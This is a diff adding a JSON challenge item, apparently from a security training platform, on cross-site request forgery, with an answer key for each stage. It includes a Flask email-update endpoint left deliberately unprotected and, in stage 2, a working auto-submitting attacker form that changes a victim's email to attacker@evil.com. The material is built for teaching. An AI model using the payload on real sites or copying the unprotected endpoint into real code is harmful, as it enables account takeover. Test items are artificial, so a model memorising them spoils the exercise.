@@ -1,0 +1,40 @@
+{
+    "id": "csrf_01",
+    "title": "Cross-Site Request Forgery",
+    "category": "CSRF",
+    "difficulty": "Intermediate",
+    "base_points": 200,
+    "description": "An endpoint that allows a user to change their email without any CSRF protection.",
+    "vuln_code": "@app.route('/update_email', methods=['POST'])\ndef update_email():\n    new_email = request.form.get('email')\n    current_user.email = new_email\n    db.save(current_user)\n    return \"Email updated!\"",
+    "stages": [
+        {
+            "id": 1,
+            "name": "Find the vulnerability",
+            "instruction": "Identify why this POST request is vulnerable to CSRF.",
+            "target": "The endpoint does not require a secret, unpredictable token to validate the request, allowing an attacker to forge it from another site."
+        },
+        {
+            "id": 2,
+            "name": "Exploit it",
+            "instruction": "Provide the HTML code for a form on an attacker's site that would automatically submit a request to update the user's email.",
+            "target": "<form action='http://victim.com/update_email' method='POST' id='csrf-form'> <input type='hidden' name='email' value='attacker@evil.com'> </form> <script>document.getElementById('csrf-form').submit();</script>"
+        },
+        {
+            "id": 3,
+            "name": "Patch it",
+            "instruction": "What is the standard defense against CSRF in web frameworks?",
+            "target": "Implementing anti-CSRF tokens (Synchronizer Token Pattern)."
+        },
+        {
+            "id": 4,
+            "name": "Explain it",
+            "instruction": "How do anti-CSRF tokens prevent this attack?",
+            "target": "The server generates a unique token for the session and requires it to be sent with every state-changing request. An attacker's site cannot access this token due to the Same-Origin Policy."
+        }
+    ],
+    "hints": [
+        "Think about how browsers automatically send cookies.",
+        "An attacker can make your browser send a request to a different domain.",
+        "Research 'CSRF tokens' or 'SameSite cookies'."
+    ]
+}
